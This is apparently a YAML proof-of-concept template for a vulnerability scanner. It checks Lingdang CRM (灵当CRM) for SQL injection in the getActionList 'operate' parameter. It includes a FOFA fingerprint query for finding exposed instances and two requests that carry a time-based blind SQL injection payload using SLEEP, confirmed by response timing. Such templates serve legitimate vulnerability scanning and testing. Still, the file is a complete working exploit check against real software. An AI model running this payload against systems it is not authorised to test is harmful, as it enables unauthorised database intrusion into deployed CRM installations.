id: poc-yaml-51mis-crm-getactionList-operate-sqli
info:
  name: 灵当CRM getActionList operate SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 灵当CRM
  fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php"
    && body="ldcrm.base.js")
variables:
  t1: random_int(3,5)
  t2: t1*2
  t3: t2 + 2
  t4: random_int(1,3)
  t5: t4*2
  t6: t5 + 2
requests:
- method: GET
  path: /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&operate=%27%20AND%20(SELECT%203408%20FROM%20(SELECT(SLEEP({{.t1}})))HtiS)--%20cbVc--+
  expression: "status_code == 200 && \ncontains(body,\"\\\"result\\\"\") &&\ncontains(body,\"\
    \\\"code\\\":1\") &&\ncontains(body,\"\\\"msg\\\":\\\"success\\\"\") &&\nduration\
    \ >= t2 &&\nduration <= t3 &&\n!contains(body,\"<\")\n"
- method: GET
  path: /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&operate=%27%20AND%20(SELECT%203408%20FROM%20(SELECT(SLEEP({{.t4}})))HtiS)--%20cbVc--+
  expression: "status_code == 200 && \ncontains(body,\"\\\"result\\\"\") &&\ncontains(body,\"\
    \\\"code\\\":1\") &&\ncontains(body,\"\\\"msg\\\":\\\"success\\\"\") &&\nduration\
    \ >= t5 &&\nduration <= t6 &&\n!contains(body,\"<\")\n"
transport: http
